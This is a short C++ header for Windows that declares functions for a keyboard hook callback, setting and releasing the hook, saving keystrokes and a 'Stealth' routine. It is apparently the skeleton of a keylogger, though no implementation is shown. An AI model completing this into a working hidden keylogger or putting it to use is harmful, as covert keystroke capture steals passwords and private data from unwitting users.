#pragma once

#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>
#include <fstream>

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

void SetHook();

void ReleaseHook();

int Save(int key_stroke);

void Stealth();